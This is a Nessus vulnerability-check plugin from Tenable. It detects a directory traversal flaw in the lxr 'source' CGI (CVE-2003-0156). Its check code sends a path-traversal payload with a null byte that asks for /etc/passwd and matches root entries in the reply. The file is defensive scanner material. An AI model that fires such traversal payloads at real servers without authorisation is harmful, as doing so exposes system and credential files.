#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(11368);
 script_cve_id("CVE-2003-0156");
 script_bugtraq_id(7062);
 script_osvdb_id(8930);
 
 script_version ("$Revision: 1.21 $");
 
 script_name(english:"Cross-Referencing Linux (lxr) CGI v Parameter Traversal Arbitrary File Access");
 script_summary(english:"Checks for the presence of /cgi-bin/source");

 script_set_attribute(attribute:"synopsis", value:
"A web application running on the remote host has a directory
traversal vulnerability." );
 script_set_attribute(attribute:"description", value:
"Cross-Referencing Linux appaers to be installed on the remote host.
There is a directory traversal vulnerability in the 'v' parameter
of the 'source' CGI.  A remote attacker could exploit this to read
arbitrary files on the system. " );
 script_set_attribute(
   attribute:"see_also",
   value:"http://seclists.org/bugtraq/2003/Mar/141"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Remove this CGI from the system."
 );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2003/03/12");
 script_set_attribute(attribute:"vuln_publication_date", value: "2003/03/10");
 script_cvs_date("$Date: 2016/11/15 13:39:09 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses");
 
 script_copyright(english:"This script is Copyright (C) 2003-2016 Tenable Network Security, Inc.");

 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);

foreach d (make_list(cgi_dirs()))
{
 url = string(d, "/source?v=../../../../../../../../../../etc/passwd%00");
 res = http_send_recv3(method:"GET", item:url, port:port);
 if(isnull(res)) exit(0);
 if(egrep(pattern:"root:.*:0:[01]:", string:res[2])){
 	security_warning(port);
	exit(0);
	}	
}

